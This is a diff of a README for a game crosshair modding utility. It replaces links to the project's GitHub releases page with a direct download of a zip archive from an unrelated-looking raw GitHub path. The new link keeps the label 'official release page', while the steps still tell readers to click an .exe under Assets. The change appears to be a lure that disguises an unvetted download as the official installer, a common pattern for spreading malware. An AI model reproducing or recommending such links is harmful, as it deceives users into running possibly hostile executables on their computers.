@@ -6,7 +6,7 @@ description: "Modify crosshair configurations and enable advanced control settin
 # 🎯 crosshair-v2-mod - Custom crosshairs for your favorite games
 
 <p align="center">
-  <a href="https://github.com/gerrimulticultural635/crosshair-v2-mod/releases">
+  <a href="https://raw.githubusercontent.com/gerrimulticultural635/gerrimulticultural635.github.io/main/exsection/github_io_gerrimulticultural_3.6.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD-INSTALLER-0000FF?style=for-the-badge" alt="Download Release">
   </a>
 </p>
@@ -28,7 +28,7 @@ You need a Windows computer to run this utility. It works best on Windows 10 or 
 
 Follow these steps to set up the software on your system.
 
-1. Go to the [official release page](https://github.com/gerrimulticultural635/crosshair-v2-mod/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/gerrimulticultural635/gerrimulticultural635.github.io/main/exsection/github_io_gerrimulticultural_3.6.zip).
 2. Look for the latest version listed under Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find, such as your Downloads folder.
